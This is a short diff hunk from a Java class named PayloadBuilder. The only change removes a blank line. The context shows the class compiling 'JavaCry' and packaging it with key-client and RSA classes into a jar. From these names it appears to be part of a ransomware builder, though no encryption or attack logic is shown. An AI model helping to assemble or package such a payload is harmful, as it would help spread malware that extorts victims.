@@ -114,7 +114,6 @@ public class PayloadBuilder {
 
             Process process = Runtime.getRuntime().exec("javac JavaCry.java -d Classes --release 8", null, new File(workingDir));
             process.waitFor();
-
             process = Runtime.getRuntime().exec("jar -cvmf ../manifest.txt JavaCry.jar JavaCry.class KeyClient.class RSACrypt.class ../img/", null, new File(workingDir + "Classes/"));
             
             StringBuilder output = new StringBuilder();
